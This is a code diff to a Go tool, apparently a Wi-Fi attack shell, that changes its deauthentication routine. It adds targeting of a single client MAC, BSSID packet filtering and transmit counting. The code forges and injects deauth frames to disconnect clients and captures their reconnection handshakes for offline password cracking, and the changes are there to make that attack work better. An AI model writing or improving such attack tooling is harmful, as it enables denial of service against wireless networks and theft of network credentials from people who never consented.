@@ -3,6 +3,7 @@ package cmd
 import (
 	"bufio"
 	"fmt"
+	"net"
 	"os"
 	"strconv"
 	"strings"
@@ -389,7 +390,36 @@ func (s *shellState) doListen(deauth bool) {
 			}
 		}
 
-		frameHex, err := drone.BuildDeauthFrame(bssid, "ff:ff:ff:ff:ff:ff", drone.ReasonClass3FromNonAssocSTA)
+		clientMAC := "ff:ff:ff:ff:ff:ff"
+		fmt.Print("[*] Target client MAC (empty = broadcast, usually ignored): ")
+		if !s.in.Scan() {
+			return
+		}
+		if v := strings.TrimSpace(s.in.Text()); v != "" {
+			if hw, err := net.ParseMAC(v); err != nil || len(hw) != 6 {
+				fmt.Println("[!] Invalid client MAC — aborting.")
+				return
+			}
+			clientMAC = v
+		}
+		if !isBroadcastMAC(clientMAC) && isGroupMAC(clientMAC) {
+			fmt.Println("[!] That is a group/multicast MAC; use a unicast client MAC.")
+			return
+		}
+		if isBroadcastMAC(clientMAC) {
+			fmt.Println("[!] Broadcast deauth is ignored by most clients, so the capture")
+			fmt.Println("    will probably contain no handshake. Prefer the client MAC.")
+			fmt.Print("[*] Continue with broadcast anyway? [y/N]: ")
+			if !s.in.Scan() {
+				return
+			}
+			if !strings.EqualFold(strings.TrimSpace(s.in.Text()), "y") {
+				fmt.Println("[-] Cancelled.")
+				return
+			}
+		}
+
+		frameHex, err := drone.BuildDeauthFrame(bssid, clientMAC, drone.ReasonClass3FromNonAssocSTA)
 		if err != nil {
 			fmt.Printf("[!] %v\n", err)
 			return
@@ -412,15 +442,21 @@ func (s *shellState) doListen(deauth bool) {
 			}
 		}
 
+		if err := s.client.SetFilter(false, bssid); err != nil {
+			fmt.Printf("[!] Warning: BPF filter failed: %v\n", err)
+		}
+
 		receiver, frames := s.startReceiver(outPath)
 		fmt.Printf("[+] Injecting %d deauth frames against %s...\n", count, bssid)
+		txBefore, txBeforeOK := readTxFrames(s.client)
 		sent, queued, failed, err := s.client.SendInjection(frameHex, count, 10)
 		if err != nil {
 			receiver.Close()
 			fmt.Printf("[!] Injection failed: %v\n", err)
 			return
 		}
-		fmt.Printf("[+] Transmitted: %d, Queued: %d, Failed: %d\n", sent, queued, failed)
+		fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
+			queued, sent, failed)
 		if queued > 0 {
 			if err := waitForTxDrain(s.client, 5*time.Second); err != nil {
 				receiver.Close()
@@ -429,6 +465,7 @@ func (s *shellState) doListen(deauth bool) {
 				return
 			}
 		}
+		reportTxDelta(s.client, txBefore, txBeforeOK, sent+queued)
 		fmt.Println("[+] Deauth sent — listening for reconnections and handshakes.")
 		fmt.Printf("    Capturing %s -> %s\n", label, outPath)
 		fmt.Println("    Press Ctrl+C to stop.")
@@ -437,6 +474,7 @@ func (s *shellState) doListen(deauth bool) {
 
 		fmt.Println("\n[*] Stopping capture...")
 		receiver.Close()
+		_ = s.client.SetFilter(false, "")
 		fmt.Printf("[+] Capture saved: %s\n", outPath)
 		reportCapture(frames.Load())
 		fmt.Println("    wireshark -r " + outPath + "   (filter: eapol || wlan.fc.type_subtype == 0x0c)")
@@ -459,6 +497,8 @@ func (s *shellState) doListen(deauth bool) {
 		if err := s.client.SetFilter(false, bssid); err != nil {
 			fmt.Printf("[!] Warning: BPF filter failed: %v\n", err)
 		}
+	} else if err := s.client.SetFilter(false, ""); err != nil {
+		fmt.Printf("[!] Warning: failed to clear inherited BPF filter: %v\n", err)
 	}
 	fmt.Printf("    Capturing %s -> %s\n", label, outPath)
 	fmt.Println("    Press Ctrl+C to stop.")
